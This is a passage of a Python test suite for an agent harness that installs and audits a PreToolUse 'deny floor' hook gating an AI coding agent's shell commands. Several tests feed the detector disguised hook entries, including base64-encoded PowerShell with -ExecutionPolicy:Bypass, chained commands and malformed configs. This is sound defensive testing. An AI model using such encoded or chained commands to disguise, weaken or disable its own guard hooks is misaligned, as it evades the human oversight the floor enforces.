from __future__ import annotations

import base64
import io
import json
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from datetime import datetime, timezone
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

import harness


class HarnessTests(unittest.TestCase):
    def make_repo(self) -> Path:
        root = Path(self.temp.name) / "repo"
        root.mkdir()
        subprocess.run(["git", "init", "-q"], cwd=root, check=True)
        return root

    def make_linked_worktree(
        self, *, separate_git_dir: bool = False
    ) -> tuple[Path, Path]:
        root = (
            self.make_separate_git_dir_repo() if separate_git_dir else self.make_repo()
        )
        subprocess.run(
            ["git", "config", "user.email", "test@example.com"], cwd=root, check=True
        )
        subprocess.run(
            ["git", "config", "user.name", "Harness Test"], cwd=root, check=True
        )
        (root / "README.md").write_text("fixture\n", encoding="utf-8")
        subprocess.run(["git", "add", "README.md"], cwd=root, check=True)
        subprocess.run(["git", "commit", "-qm", "create fixture"], cwd=root, check=True)
        linked = Path(self.temp.name) / "linked"
        subprocess.run(
            ["git", "worktree", "add", "--detach", str(linked), "HEAD"],
            cwd=root,
            check=True,
        )
        return root, linked

    def make_separate_git_dir_repo(self) -> Path:
        root = Path(self.temp.name) / "separate-git-checkout"
        git_dir = Path(self.temp.name) / "separate-git-data"
        subprocess.run(
            ["git", "init", "-q", "--separate-git-dir", str(git_dir), str(root)],
            check=True,
        )
        return root

    def make_directory_alias(self, target: Path, alias: Path):
        try:
            alias.symlink_to(target, target_is_directory=True)
            return alias.unlink
        except OSError as exc:
            if sys.platform != "win32":
                self.skipTest(f"directory symlinks unavailable: {exc}")
            junction = subprocess.run(
                ["cmd", "/d", "/c", "mklink", "/J", str(alias), str(target)],
                capture_output=True,
                text=True,
                check=False,
            )
            if junction.returncode:
                self.skipTest(
                    "directory aliases unavailable: "
                    f"{exc}; {junction.stderr or junction.stdout}"
                )
            return alias.rmdir

    @staticmethod
    def write_hooks(checkout: Path, text: str) -> Path:
        hooks = checkout / ".codex" / "hooks.json"
        hooks.parent.mkdir(parents=True, exist_ok=True)
        hooks.write_text(text, encoding="utf-8")
        return hooks

    @staticmethod
    def inline_floor_config_text() -> str:
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        return (
            "[[hooks.PreToolUse]]\n"
            'matcher = "^Bash$"\n\n'
            "[[hooks.PreToolUse.hooks]]\n"
            'type = "command"\n'
            f'command = \'expected={pin}; python3 "$HOME/.claude/hooks/dispatch.py" '
            "--event pre --runtime codex'\n"
            f"commandWindows = \"$expected='{pin}'; py -3 "
            '$env:USERPROFILE/.claude/hooks/dispatch.py --event pre --runtime codex"\n'
            "timeout = 5\n"
        )

    @classmethod
    def write_inline_floor(cls, checkout: Path) -> Path:
        config = checkout / ".codex" / "config.toml"
        config.parent.mkdir(parents=True, exist_ok=True)
        config.write_text(cls.inline_floor_config_text(), encoding="utf-8")
        return config

    def run_doctor_with_fixture_globals(
        self,
        repo: Path,
        *,
        user_config: str | None = None,
        profile_configs: dict[str, str] | None = None,
        system_config: str | None = None,
        system_hooks: str | None = None,
        system_requirements: str | None = None,
        managed_config: str | None = None,
    ) -> tuple[int, str]:
        root = Path(self.temp.name)
        codex_home = root / "codex-home"
        claude_home = root / "claude-home"
        skills_home = root / "skills-home"
        (codex_home / "AGENTS.md").parent.mkdir()
        (codex_home / "AGENTS.md").write_text("# Codex\n", encoding="utf-8")
        if user_config is not None:
            (codex_home / "config.toml").write_text(user_config, encoding="utf-8")
        for filename, contents in (profile_configs or {}).items():
            (codex_home / filename).write_text(contents, encoding="utf-8")
        if system_config is not None:
            (root / "system-config.toml").write_text(system_config, encoding="utf-8")
        if system_hooks is not None:
            (root / "hooks.json").write_text(system_hooks, encoding="utf-8")
        if system_requirements is not None:
            (root / "requirements.toml").write_text(
                system_requirements, encoding="utf-8"
            )
        if managed_config is not None:
            (root / "managed-config.toml").write_text(managed_config, encoding="utf-8")
        harness_root = Path(harness.__file__).resolve().parent
        for filename in ("dispatch.py", "smoke_test.py"):
            target = claude_home / "hooks" / filename
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(
                (harness_root / "templates" / "hooks" / filename).read_bytes()
            )
        (skills_home / "sample").mkdir(parents=True)
        (skills_home / "sample" / "SKILL.md").write_text("# Skill\n", encoding="utf-8")
        args = SimpleNamespace(
            codex_home=str(codex_home),
            claude_home=str(claude_home),
            skills_home=str(skills_home),
            repo=str(repo),
        )
        original_run = harness.run

        def fixture_run(
            command: list[str], cwd: Path | None = None
        ) -> subprocess.CompletedProcess[str]:
            if command == [sys.executable, "--version"]:
                return subprocess.CompletedProcess(command, 0, "Python fixture", "")
            if command == ["git", "--version"]:
                return subprocess.CompletedProcess(command, 0, "git fixture", "")
            if command == ["codex", "--version"] or command[-1:] == ["codex --version"]:
                return subprocess.CompletedProcess(command, 0, "codex fixture", "")
            return original_run(command, cwd)

        output = io.StringIO()
        with mock.patch.object(harness, "run", side_effect=fixture_run):
            with mock.patch.object(
                harness,
                "codex_system_config_path",
                return_value=root / "system-config.toml",
            ):
                with mock.patch.object(
                    harness,
                    "codex_managed_config_path",
                    return_value=root / "managed-config.toml",
                ):
                    with redirect_stdout(output):
                        result = harness.doctor(args)
        return result, output.getvalue()

    def run_doctor_with_denied_static_source(
        self, repo: Path, denied_path: Path, **fixtures: str
    ) -> tuple[int, str]:
        original_is_file = Path.is_file
        original_read_text = Path.read_text

        def fixture_is_file(path: Path) -> bool:
            if path == denied_path:
                return False
            return original_is_file(path)

        def fixture_read_text(path: Path, *args: object, **kwargs: object) -> str:
            if path == denied_path:
                raise PermissionError("fixture denied")
            return original_read_text(path, *args, **kwargs)

        with mock.patch.object(
            Path, "is_file", autospec=True, side_effect=fixture_is_file
        ):
            with mock.patch.object(
                Path, "read_text", autospec=True, side_effect=fixture_read_text
            ):
                return self.run_doctor_with_fixture_globals(repo, **fixtures)

    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()

    def tearDown(self) -> None:
        self.temp.cleanup()

    def test_seed_creates_runtime_neutral_tier(self) -> None:
        repo = self.make_repo()
        args = SimpleNamespace(
            path=str(repo),
            tier=2,
            push="free",
            merge="free",
            human_todo=None,
            sensitive_data=True,
            relaxed_work_loss_guards=False,
            dry_run=False,
        )
        self.assertEqual(harness.seed_repo(args), 0)
        data = json.loads(
            (repo / ".agent-harness" / "tier.json").read_text(encoding="utf-8")
        )
        self.assertEqual(data["name"], "daily-driver")
        self.assertTrue(data["flags"]["sensitive_data"])

    def test_seed_refuses_overwrite(self) -> None:
        repo = self.make_repo()
        target = repo / ".agent-harness" / "tier.json"
        target.parent.mkdir()
        target.write_text("{}", encoding="utf-8")
        args = SimpleNamespace(
            path=str(repo),
            tier=1,
            push="free",
            merge="free",
            human_todo=None,
            sensitive_data=False,
            relaxed_work_loss_guards=False,
            dry_run=False,
        )
        with self.assertRaises(harness.HarnessError):
            harness.seed_repo(args)

    def test_seed_refuses_legacy_tier_override(self) -> None:
        repo = self.make_repo()
        target = repo / ".claude" / "tier.json"
        target.parent.mkdir()
        target.write_text("{}", encoding="utf-8")
        args = SimpleNamespace(
            path=str(repo),
            tier=2,
            push="free",
            merge="free",
            human_todo=None,
            sensitive_data=False,
            relaxed_work_loss_guards=False,
            dry_run=False,
        )
        with self.assertRaises(harness.HarnessError):
            harness.seed_repo(args)

    def test_audit_accepts_minimal_t2_repo(self) -> None:
        repo = self.make_repo()
        (repo / "AGENTS.md").write_text("# Agent guidance\n", encoding="utf-8")
        tier = {
            "tier": 2,
            "name": "daily-driver",
            "authority": {"push": "free", "merge": "free"},
            "flags": {"sensitive_data": False},
        }
        target = repo / ".agent-harness" / "tier.json"
        target.parent.mkdir()
        target.write_text(json.dumps(tier), encoding="utf-8")
        result = harness.audit_repo(repo)
        self.assertTrue(result["ok"], result["issues"])

    def test_audit_finds_stale_profile_path(self) -> None:
        repo = self.make_repo()
        (repo / "AGENTS.md").write_text(
            "See C:/Users/jekyt/source/repo\n", encoding="utf-8"
        )
        result = harness.audit_repo(repo)
        self.assertTrue(
            any("stale jekyt-profile" in issue for issue in result["issues"])
        )

    def test_remove_managed_floor_preserves_unrelated_hooks(self) -> None:
        dispatcher = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        managed_handler = harness.canonical_legacy_codex_floor_handler(dispatcher)
        current = json.dumps(
            {
                "hooks": {
                    "SessionStart": [
                        {"hooks": [{"type": "command", "command": "keep"}]}
                    ],
                    "PreToolUse": [
                        {
                            "hooks": [
                                managed_handler,
                                {
                                    "type": "command",
                                    "command": "python keep_unrelated.py",
                                },
                            ]
                        }
                    ],
                }
            }
        )
        result = json.loads(harness.remove_managed_codex_floor(current, dispatcher))
        self.assertEqual(
            result["hooks"]["SessionStart"][0]["hooks"][0]["command"], "keep"
        )
        self.assertEqual(
            result["hooks"]["PreToolUse"][0]["hooks"],
            [{"type": "command", "command": "python keep_unrelated.py"}],
        )

    def test_remove_managed_floor_deletes_empty_document(self) -> None:
        dispatcher = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        managed_handler = harness.canonical_legacy_codex_floor_handler(dispatcher)
        current = json.dumps({"hooks": {"PreToolUse": [{"hooks": [managed_handler]}]}})
        self.assertEqual(harness.remove_managed_codex_floor(current, dispatcher), "")

    def test_remove_managed_floor_refuses_nonfinite_rewrite(self) -> None:
        dispatcher = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        managed_handler = harness.canonical_legacy_codex_floor_handler(dispatcher)
        current = (
            '{"hooks":{"FutureEvent":1e400,"PreToolUse":[{"hooks":['
            f"{json.dumps(managed_handler)}"
            "]}]}}"
        )
        with self.assertRaises(harness.HarnessError):
            harness.remove_managed_codex_floor(current, dispatcher)

    def test_remove_managed_floor_normalizes_deep_ignored_rewrite(self) -> None:
        dispatcher = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        managed_handler = harness.canonical_legacy_codex_floor_handler(dispatcher)
        ignored_depth = ('{"nested":' * 10000) + "0" + ("}" * 10000)
        current = (
            '{"hooks":{"FutureEvent":'
            + ignored_depth
            + ',"PreToolUse":[{"hooks":['
            + json.dumps(managed_handler)
            + "]}]}}"
        )
        with self.assertRaises(harness.HarnessError):
            harness.remove_managed_codex_floor(current, dispatcher)

    def test_remove_managed_floor_retains_unowned_dispatcher(self) -> None:
        managed = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        current = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "python D:/custom/dispatch.py --event pre --runtime codex",
                                }
                            ]
                        }
                    ]
                }
            }
        )
        self.assertEqual(len(harness.managed_codex_floor_groups(current)), 1)
        self.assertEqual(harness.remove_managed_codex_floor(current, managed), current)

    def test_remove_managed_floor_retains_partial_or_chained_handler(self) -> None:
        managed = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        canonical = harness.canonical_legacy_codex_floor_handler(managed)
        for handler in (
            {"type": "command", "command": canonical["command"]},
            {
                **canonical,
                "commandWindows": (
                    f"{canonical['commandWindows']}; Write-Output custom"
                ),
            },
            {
                **canonical,
                "command": (f"echo {managed} --event pre --runtime codex"),
            },
        ):
            with self.subTest(handler=handler):
                current = json.dumps({"hooks": {"PreToolUse": [{"hooks": [handler]}]}})
                self.assertEqual(
                    harness.remove_managed_codex_floor(current, managed), current
                )

    def test_global_floor_detection_is_fail_closed(self) -> None:
        encoded_script = "$d='D:/custom/dispatch.py'; & $d --event pre"
        encoded = base64.b64encode(encoded_script.encode("utf-16-le")).decode("ascii")
        for handler in (
            {
                "type": "command",
                "command": "python D:/custom/dispatch.py --event pre",
            },
            {
                "type": "command",
                "command": "powershell .codex/invoke_deny_floor.ps1",
            },
            {
                "type": "command",
                "command": "python D:/custom/dispatch.py --event=pre --runtime=codex",
            },
            {
                "type": "command",
                "command": "echo noop",
                "commandWindows": f"powershell -EncodedCommand {encoded}",
            },
        ):
            with self.subTest(handler=handler):
                current = json.dumps({"hooks": {"PreToolUse": [{"hooks": [handler]}]}})
                self.assertEqual(len(harness.managed_codex_floor_groups(current)), 1)

    def test_global_floor_detection_decodes_powershell_abbreviations(self) -> None:
        encoded_script = (
            "$d='$HOME/.claude/hooks/dispatch.py'; " "& $d --event pre --runtime codex"
        )
        encoded = base64.b64encode(encoded_script.encode("utf-16-le")).decode("ascii")
        for flag in ("-E", "-Ec", "-En", "-Enco", "-EncodedCommand"):
            with self.subTest(flag=flag):
                handler = {
                    "type": "command",
                    "command": "echo noop",
                    "commandWindows": f"powershell {flag} {encoded}",
                }
                current = json.dumps({"hooks": {"PreToolUse": [{"hooks": [handler]}]}})
                self.assertIn(
                    "dispatch.py",
                    harness.decode_windows_hook_command(handler["commandWindows"]),
                )
                self.assertEqual(len(harness.managed_codex_floor_groups(current)), 1)
                self.assertEqual(len(harness.repo_codex_floor_candidates(current)), 1)

        malformed = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "echo noop",
                                    "commandWindows": "powershell -Ec not-base64",
                                }
                            ]
                        }
                    ]
                }
            }
        )
        self.assertEqual(len(harness.managed_codex_floor_groups(malformed)), 1)
        self.assertEqual(len(harness.repo_codex_floor_candidates(malformed)), 1)
        self.assertEqual(harness.repo_codex_floor_groups(malformed), [])
        for command in (
            f"powershell -EncodedCommand:{encoded}",
            f"powershell -NoProfile:true -EncodedCommand {encoded}",
            f"powershell -ExecutionPolicy:Bypass -EncodedCommand {encoded}",
            f"powershell -NoLogo: -EncodedCommand {encoded}",
            f"powershell -n -EncodedCommand {encoded}",
            f"powershell -i -EncodedCommand {encoded}",
        ):
            with self.subTest(command=command):
                self.assertNotIn(
                    "dispatch.py", harness.decode_windows_hook_command(command)
                )

    def test_windows_hook_command_alias_is_audited(self) -> None:
        alias_only_global = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "echo noop",
                                    "command_windows": (
                                        'py -3 "$env:USERPROFILE/.claude/hooks/'
                                        'dispatch.py" --event pre --runtime codex'
                                    ),
                                }
                            ]
                        }
                    ]
                }
            }
        )
        self.assertEqual(len(harness.managed_codex_floor_groups(alias_only_global)), 1)
        self.assertEqual(len(harness.repo_codex_floor_candidates(alias_only_global)), 1)

        adapter_path = Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        adapter = json.loads(adapter_path.read_text(encoding="utf-8"))
        handler = adapter["hooks"]["PreToolUse"][0]["hooks"][0]
        handler["command_windows"] = handler.pop("commandWindows")
        alias_adapter = json.dumps(adapter)
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        self.assertEqual(len(harness.repo_codex_floor_groups(alias_adapter, pin)), 1)

    def test_hooks_helpers_reject_wrong_shapes(self) -> None:
        for current in ("[]", "null", '"text"', "1"):
            with self.subTest(current=current):
                with self.assertRaises(harness.HarnessError):
                    harness.managed_codex_floor_groups(current)
                with self.assertRaises(harness.HarnessError):
                    harness.repo_codex_floor_groups(current)
                with self.assertRaises(harness.HarnessError):
                    harness.remove_managed_codex_floor(current)
        with self.assertRaises(harness.HarnessError):
            harness.managed_codex_floor_groups(
                json.dumps({"hooks": {"PreToolUse": [{"hooks": None}]}})
            )
        wrong = (
            {"hooks": {"PreToolUse": [{"matcher": 7, "hooks": []}]}},
            {
                "hooks": {
                    "PreToolUse": [{"hooks": [{"type": 7, "command": "echo safe"}]}]
                }
            },
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "echo safe",
                                    "command_windows": 7,
                                }
                            ]
                        }
                    ]
                }
            },
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "echo safe",
                                    "commandWindows": "echo one",
                                    "command_windows": "echo two",
                                }
                            ]
                        }
                    ]
                }
            },
        )
        for document in wrong:
            with self.subTest(document=document):
                with self.assertRaises(harness.HarnessError):
                    harness.repo_codex_floor_groups(json.dumps(document))
        self.assertEqual(
            harness.repo_codex_floor_groups(
                json.dumps({"hooks": {"PreToolUse": [{}]}})
            ),
            [],
        )

    def test_hooks_json_rejects_invalid_whole_document(self) -> None:
        invalid_documents = (
            "",
            '{"hooks": {}, "unknown": true}',
            '{"description": 7, "hooks": {}}',
            '{"hooks": {}, "hooks": {}}',
            '{"hooks": {"SessionStart": [], "SessionStart": []}}',
            (
                '{"hooks":{"PreToolUse":[{"hooks":[{"type":"command",'
                '"command":"echo one","command":"echo two"}]}]}}'
            ),
            '{"description": NaN, "hooks": {}}',
            '{"description": Infinity, "hooks": {}}',
            '{"description": -Infinity, "hooks": {}}',
            '{"description": 1e400, "hooks": {}}',
            '{"description": "\\ud800", "hooks": {}}',
            (
                '{"hooks":{"PreToolUse":[{"hooks":[{"type":"prompt",'
                '"ignored":"\\ud800"}]}]}}'
            ),
            (
                '{"hooks":{"PreToolUse":[{"hooks":[{"type":"agent",'
                '"ignored":1e400}]}]}}'
            ),
        )
        for current in invalid_documents:
            with self.subTest(current=current):
                with self.assertRaises(harness.HarnessError):
                    harness.parse_hooks_document(current)
        ignored_value = (
            '{"hooks":{"FutureEvent":{"duplicate":1,"duplicate":2,'
            '"value":"\\ud800","overflow":1e400},"PreToolUse":'
            '[{"hooks":[{"type":"prompt","ignored":1,"ignored":2}]}]}}'
        )
        harness.parse_hooks_document(ignored_value)
        nested: object = 0
        for _index in range(160):
            nested = [nested]
        deeply_nested = {"hooks": {"FutureEvent": nested}}
        harness.parse_hooks_document(json.dumps(deeply_nested))
        handler_content: object = 0
        for _index in range(harness.SERDE_JSON_HANDLER_CONTENT_MAX_CONTAINERS):
            handler_content = [handler_content]
        boundary_handler = {
            "hooks": {
                "PreToolUse": [
                    {"hooks": [{"type": "prompt", "ignored": handler_content}]}
                ]
            }
        }
        harness.parse_hooks_document(json.dumps(boundary_handler))
        boundary_handler["hooks"]["PreToolUse"][0]["hooks"][0]["ignored"] = [
            handler_content
        ]
        with self.assertRaises(harness.HarnessError):
            harness.parse_hooks_document(json.dumps(boundary_handler))
        huge_integer = "9" * 5000
        harness.parse_hooks_document(f'{{"hooks":{{"FutureEvent":{huge_integer}}}}}')

    def test_hooks_json_normalizes_decoder_recursion_failure(self) -> None:
        with mock.patch.object(
            harness.json,
            "loads",
            side_effect=RecursionError("fixture depth"),
        ):
            with self.assertRaisesRegex(
                harness.HarnessError,
                r"invalid existing hooks\.json: fixture depth",
            ):
                harness.parse_hooks_document('{"hooks":{}}')

    def test_hooks_schema_rejects_negative_zero_unsigned_fields(self) -> None:
        for field in ("timeout", "additionalContextLimit"):
            with self.subTest(field=field):
                document = (
                    '{"hooks":{"PreToolUse":[{"hooks":[{"type":"command",'
                    '"command":"echo safe","' + field + '":-0}]}]}}'
                )
                with self.assertRaises(harness.HarnessError):
                    harness.parse_hooks_document(document)

    def test_hooks_schema_validates_every_known_event(self) -> None:
        adapter_path = Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        adapter = json.loads(adapter_path.read_text(encoding="utf-8"))
        for event_name in harness.CODEX_HOOK_EVENT_NAMES:
            with self.subTest(event_name=event_name):
                document = json.loads(json.dumps(adapter))
                document["hooks"][event_name] = [
                    {"hooks": [{"type": "command", "command": 7}]}
                ]
                with self.assertRaises(harness.HarnessError):
                    harness.repo_codex_floor_groups(json.dumps(document))

    def test_hooks_schema_rejects_malformed_groups_and_handlers(self) -> None:
        invalid_groups = (
            7,
            [7],
            [{"matcher": 7}],
            [{"hooks": None}],
            [{"hooks": [7]}],
        )
        for groups in invalid_groups:
            with self.subTest(groups=groups):
                document = {"hooks": {"SessionStart": groups}}
                with self.assertRaises(harness.HarnessError):
                    harness.parse_hooks_document(json.dumps(document))

        invalid_handlers = (
            {},
            {"type": 7},
            {"type": "unknown"},
            {"type": "command"},
            {"type": "command", "command": 7},
            {"type": "command", "command": "ok", "commandWindows": 7},
            {
                "type": "command",
                "command": "ok",
                "commandWindows": "one",
                "command_windows": "two",
            },
            {"type": "command", "command": "ok", "timeout": 1.5},
            {"type": "command", "command": "ok", "timeout": True},
            {"type": "command", "command": "ok", "timeout": -1},
            {"type": "command", "command": "ok", "timeout": 1 << 64},
            {"type": "command", "command": "ok", "async": None},
            {"type": "command", "command": "ok", "async": 0},
            {"type": "command", "command": "ok", "async": "false"},
            {"type": "command", "command": "ok", "statusMessage": 7},
            {
                "type": "command",
                "command": "ok",
                "additionalContextLimit": True,
            },
            {
                "type": "command",
                "command": "ok",
                "additionalContextLimit": 1.5,
            },
            {
                "type": "command",
                "command": "ok",
                "additionalContextLimit": -1,
            },
            {
                "type": "command",
                "command": "ok",
                "additionalContextLimit": harness.USIZE_MAX + 1,
            },
        )
        for handler in invalid_handlers:
            with self.subTest(handler=handler):
                document = {"hooks": {"SessionStart": [{"hooks": [handler]}]}}
                with self.assertRaises(harness.HarnessError):
                    harness.parse_hooks_document(json.dumps(document))

    def test_hooks_schema_accepts_codex_defaults_and_nullable_fields(self) -> None:
        document = {
            "description": None,
            "hooks": {
                "FutureEvent": 7,
                "SessionStart": [
                    {},
                    {"matcher": None},
                    {
                        "matcher": "startup",
                        "hooks": [
                            {"type": "prompt", "ignored": 7},
                            {"type": "agent", "command": 7},
                            {
                                "type": "command",
                                "command": "echo ok",
                                "commandWindows": None,
                                "timeout": None,
                                "async": False,
                                "statusMessage": None,
                                "additionalContextLimit": None,
                                "ignored": 7,
                            },
                        ],
                    },
                ],
            },
        }
        current_data, hooks, groups = harness.parse_hooks_document(json.dumps(document))
        self.assertEqual(current_data, document)
        self.assertIs(hooks, current_data["hooks"])
        self.assertEqual(groups, [])
        self.assertEqual(harness.parse_hooks_document('{"description": "ok"}')[1], {})

    def test_non_command_handlers_never_count_as_floor_candidates(self) -> None:
        for handler in (
            {
                "type": "prompt",
                "command": (
                    "python $HOME/.claude/hooks/dispatch.py "
                    "--event pre --runtime codex"
                ),
            },
            {
                "type": "agent",
                "command": 7,
                "commandWindows": "one",
                "command_windows": "two",
            },
        ):
            with self.subTest(handler=handler):
                current = json.dumps({"hooks": {"PreToolUse": [{"hooks": [handler]}]}})
                self.assertEqual(harness.managed_codex_floor_groups(current), [])
                self.assertEqual(harness.repo_codex_floor_candidates(current), [])
                self.assertEqual(harness.repo_codex_floor_groups(current), [])
                self.assertFalse(harness.is_global_floor_handler(handler))
                self.assertFalse(harness.is_direct_codex_floor_handler(handler))

    def test_inline_hook_metadata_matches_each_codex_source_kind(self) -> None:
        valid_config = {
            "hooks": {
                "state": {
                    "one": {
                        "enabled": True,
                        "trusted_hash": "abc",
                        "ignored": 7,
                    }
                }
            }
        }
        harness.parse_hooks_document(json.dumps(valid_config), source_kind="config")
        valid_requirements = {
            "hooks": {
                "managed_dir": "/managed/hooks",
                "windows_managed_dir": "C:/managed/hooks",
            }
        }
        harness.parse_hooks_document(
            json.dumps(valid_requirements), source_kind="requirements"
        )
        invalid_config_states = (
            {"hooks": {"state": 7}},
            {"hooks": {"state": {"one": 7}}},
            {"hooks": {"state": {"one": {"enabled": "yes"}}}},
            {"hooks": {"state": {"one": {"trusted_hash": 7}}}},
        )
        for malformed_state in invalid_config_states:
            with self.assertRaises(harness.HarnessError):
                harness.parse_hooks_document(
                    json.dumps(malformed_state), source_kind="config"
                )

        invalid_requirements = (
            {"hooks": {"managed_dir": 7}},
            {"hooks": {"windows_managed_dir": ["bad"]}},
        )
        for document in invalid_requirements:
            with self.subTest(document=document):
                with self.assertRaises(harness.HarnessError):
                    harness.parse_hooks_document(
                        json.dumps(document), source_kind="requirements"
                    )

    def test_toml_config_rejects_out_of_range_integers(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(
            f"[hooks]\nignored = {harness.I64_MAX + 1}\n", encoding="utf-8"
        )
        with self.assertRaises(harness.HarnessError):
            harness.toml_config(config)

    def test_toml_config_normalizes_parser_recursion(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(
            "ignored = " + ("[" * 1100) + "0" + ("]" * 1100), encoding="utf-8"
        )
        with self.assertRaises(harness.HarnessError):
            harness.toml_config(config)

    def test_toml_config_handles_deep_post_parse_validation(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(("nested." * 1100) + "leaf = 0", encoding="utf-8")
        self.assertIsNotNone(harness.toml_config(config))

    def test_inline_hooks_preserve_ignored_toml_datetime(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(
            "[hooks]\nFutureEvent = 1979-05-27T07:32:00Z\n"
            + self.inline_floor_config_text(),
            encoding="utf-8",
        )
        document = harness.inline_hooks_document(config)
        self.assertEqual(
            len(harness.managed_codex_floor_groups(document, source_kind="config")),
            1,
        )

    def test_inline_hook_conversions_normalize_serializer_recursion(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text("hooks." + ("nested." * 10000) + "leaf = 0", encoding="utf-8")

        with self.assertRaises(harness.HarnessError):
            harness.inline_hooks_document(config)
        with self.assertRaises(harness.HarnessError):
            harness.inline_hook_documents_from_config(config)

    def test_doctor_rejects_malformed_sibling_project_event(self) -> None:
        repo = self.make_repo()
        adapter_path = Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        adapter = json.loads(adapter_path.read_text(encoding="utf-8"))
        adapter["hooks"]["SessionStart"] = [
            {"hooks": [{"type": "command", "command": 7}]}
        ]
        self.write_hooks(repo, json.dumps(adapter))

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("[FAIL] project Codex floor", output)
        self.assertIn("SessionStart", output)

    def test_doctor_rejects_malformed_sibling_global_event(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        malformed_global = (
            "[[hooks.SessionStart]]\n"
            "[[hooks.SessionStart.hooks]]\n"
            'type = "command"\n'
            "command = 7\n"
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=malformed_global
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("SessionStart", output)

    def test_doctor_rejects_malformed_user_hook_state(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config=(
                "[hooks.state.floor]\n" 'enabled = "yes"\n' 'trusted_hash = "abc"\n'
            ),
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("hooks.state.floor.enabled", output)

    def test_doctor_rejects_malformed_project_hook_state(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        config = repo / ".codex" / "config.toml"
        config.write_text("[hooks.state.floor]\n" 'enabled = "yes"\n', encoding="utf-8")

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("[FAIL] project Codex floor", output)
        self.assertIn("hooks.state.floor.enabled", output)

    def test_doctor_rejects_malformed_requirements_hook_path(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements="[hooks]\nmanaged_dir = 7\n"
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("hooks.managed_dir", output)

    def test_doctor_rejects_managed_only_hook_policy(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements="allow_managed_hooks_only = true\n"
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("allow_managed_hooks_only=true", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_accepts_explicit_unmanaged_hook_policy(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements="allow_managed_hooks_only = false\n"
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_rejects_malformed_managed_only_hook_policy(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements='allow_managed_hooks_only = "false"\n'
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("must be a boolean", output)

    def test_doctor_rejects_required_hook_feature_disable(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
